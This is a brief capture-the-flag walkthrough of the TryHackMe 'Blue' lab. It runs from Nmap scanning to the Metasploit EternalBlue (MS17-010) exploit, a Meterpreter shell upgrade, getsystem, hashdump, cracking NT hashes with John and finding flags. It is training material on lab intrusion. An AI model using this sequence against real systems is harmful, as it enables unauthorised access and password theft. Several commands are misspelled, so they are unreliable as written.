##########
Twitter @SteveIrwinCyber
##########

Blue
Tryhackme.com
############

### TASK 1: Scan and learn what exploit this machine is vulnerable to.
    target: 
    scan run: namp -A -T4 10.10.119.101
    nmap =sV 10.10.119.101

    135
    139
    445- Windows 7 professional 6701 Service pack 1
    3389

  ### Q1: What ports are open/how many under 1000
    3
  ### Q2: What is this machine vulnerable to (ie: ms08-067)
    Eternal Blue
    ms17-010
  

### Task 2: Exploit machine and gain foothold
    msfconsole
   
### Q1: What is the exploit full path
    exploit/windows/smb/ms17_010_eternalblue
### Q2: What is required value 
    RHOSTS 
### Task 3: Escalate privlidges, learn how to upgrade shells in metasploit
    background session
    use post/multi/manage/shell_to_meterpreter
    set sesion 2
### Task 4: Dump non-default user's password and crack it
    getsystem
    shell
    whoami
    ps
    migrate 2860
    hashdump
    john hashes --worldlist=/usr/share/wordlits/rockyou.txt --format=NT
### Task 5: Find 3 flags planted on this machine 
    ls C:\
    ls C:\users\jon\documents
    ls c:\windows\system32\config
